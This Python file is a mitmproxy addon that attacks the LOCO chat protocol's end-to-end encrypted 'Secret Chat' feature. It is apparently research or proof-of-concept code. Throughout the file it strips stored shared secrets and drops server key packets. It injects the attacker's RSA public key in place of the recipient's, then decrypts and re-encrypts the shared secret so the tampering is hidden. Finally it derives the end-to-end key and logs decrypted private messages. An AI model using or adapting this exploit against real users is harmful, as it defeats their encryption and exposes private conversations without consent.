import base64
import logging

from lib.crypto_utils import get_e2e_encryption_key, get_rsa_key_pair
from lib.loco_parser import LocoParser
from mitmproxy import connection, tcp, tls
from mitmproxy.utils import human, strutils


class LocoMitmBase:
    def __init__(self, rsa_key_pair) -> None:
        self.parser = LocoParser()
        self.rsa_key_pair = rsa_key_pair
        self.recipient_public_key = b""
        self.shared_secret = b""
        self.e2e_encryption_key = b""
        self.cached_packet = b""

    @staticmethod
    def get_addr(server: connection.Server):
        return server.peername or server.address

    def tls_clienthello(self, data: tls.ClientHelloData):
        server_address = self.get_addr(data.context.server)
        logging.info("Skip TLS intercept for %s.", human.format_address(server_address))
        data.ignore_connection = True


class SecretChatMitm(LocoMitmBase):
    def compute_e2e_encryption_key(self, shared_secret):
        if not self.e2e_encryption_key:
            self.e2e_encryption_key = get_e2e_encryption_key(shared_secret)
            logging.warning(
                "Shared secret: %s E2E encryption key: %s",
                shared_secret,
                base64.b64encode(self.e2e_encryption_key),
            )

    def tcp_message(self, flow: tcp.TCPFlow):
        message = flow.messages[-1]

        # Flaky way to reassemble fragmented LOCO packets
        # TODO: Fix this.
        if self.cached_packet:
            logging.warning("Trying to reassemble LOCO packet...")
            self.parser.parse(self.cached_packet + message.content)
            self.cached_packet = b""
        else:
            self.parser.parse(message.content)

        if self.parser.loco_encrypted_packet.is_fragmented:
            self.cached_packet = message.content
            logging.warning(
                "%s packet is fragmented. Dropping it...",
                self.parser.loco_packet.loco_command,
            )
            message.content = b""
            return

        # Log LOCO packets to STDOUT
        if self.parser.loco_packet:
            decoded_loco_packet = self.parser.loco_packet.get_packet_as_dict()

            logging.info(
                "from_client=%s, content=%s",
                message.from_client,
                decoded_loco_packet,
            )
        else:
            logging.warning(
                "from_client=%s, raw packet bytes=%s",
                message.from_client,
                strutils.bytes_to_escaped_str(message.content),
            )
            return

        # If there's already a shared secret stored on the server-side remove it
        if (
            not self.e2e_encryption_key
            and not message.from_client
            and self.parser.loco_packet.loco_command
            in {
                "SCREATE",
                "CHATONROOM",
            }
        ):
            if isinstance(self.parser.loco_packet.body_payload, bytes):
                logging.warning(
                    "Dropping %s packet as we cannot decode the packet body...",
                    self.parser.loco_packet.loco_command,
                )
                message.content = b""
                return

            tampered_packet = self.parser.remove_stored_shared_secret()

            if tampered_packet:
                message.content = tampered_packet
                self.parser.parse(message.content)

        # Drop server-side "SETSK" LOCO packets
        if not message.from_client and self.parser.loco_packet.loco_command == "SETSK":
            logging.warning("Dropping server-side SETSK packet...")
            message.content = b""
            return

        # Get recipient's public key and replace it with our MITM public key
        if not message.from_client and self.parser.loco_packet.loco_command in {
            "GETPK",
            "GETLPK",
            "SCREATE",
            "CHATONROOM",
        }:
            logging.warning(
                "Trying to parse recipient's public key from %s packet...",
                self.parser.loco_packet.loco_command,
            )
            (
                recipient_public_key,
                tampered_packet,
            ) = self.parser.inject_public_key(self.rsa_key_pair)

            if not recipient_public_key:
                logging.error(
                    "Could not parse recipient public key from %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return
            else:
                self.recipient_public_key = recipient_public_key

            if not tampered_packet:
                logging.error(
                    "Could not create a fake %s packet.",
                    self.parser.loco_packet.loco_command,
                )
                return

            logging.warning(
                "Injecting MITM public key into %s packet...",
                self.parser.loco_packet.loco_command,
            )

            message.content = tampered_packet
            return

        # Grab the shared secret from the "SETSK" packet
        if (
            self.recipient_public_key
            and message.from_client
            and self.parser.loco_packet.loco_command == "SETSK"
        ):
            logging.warning(
                "Trying to decrypt shared secret from %s packet...",
                self.parser.loco_packet.loco_command,
            )

            shared_secret_encoded = self.parser.get_shared_secret(self.rsa_key_pair)

            if not shared_secret_encoded:
                logging.error(
                    "Couldn't decrypt shared secret from %s packet. Dropping it...",
                    self.parser.loco_packet.loco_command,
                )
                message.content = b""
                return

            self.shared_secret = shared_secret_encoded
            logging.warning("Shared secret: %s", self.shared_secret)

            # Re-encrypt shared secret with the recipient's original public key
            logging.warning("Trying to re-encrypt shared secret...")

            tampered_packet = self.parser.encrypt_shared_secret(
                self.shared_secret, self.recipient_public_key
            )

            if tampered_packet:
                message.content = tampered_packet
                logging.warning(
                    "Re-encrypted shared secret with recipient's original public key."
                )

        # Compute E2E encryption key
        if self.shared_secret:
            self.compute_e2e_encryption_key(self.shared_secret)

        # Decrypt Secret Chat end-to-end encrypted message
        if (
            self.e2e_encryption_key
            and self.shared_secret
            and (
                (
                    message.from_client
                    and self.parser.loco_packet.loco_command == "SWRITE"
                )
                or (
                    not message.from_client
                    and self.parser.loco_packet.loco_command == "MSG"
                )
            )
        ):
            logging.warning("Trying to decrypt Secret Chat message...")

            decrypted_e2e_message = self.parser.get_decrypted_e2e_message(
                self.e2e_encryption_key, self.shared_secret
            )

            if decrypted_e2e_message:
                logging.warning(
                    "from_client=%s, Secret Chat message=%s",
                    message.from_client,
                    decrypted_e2e_message,
                )


addons = [SecretChatMitm(rsa_key_pair=get_rsa_key_pair())]
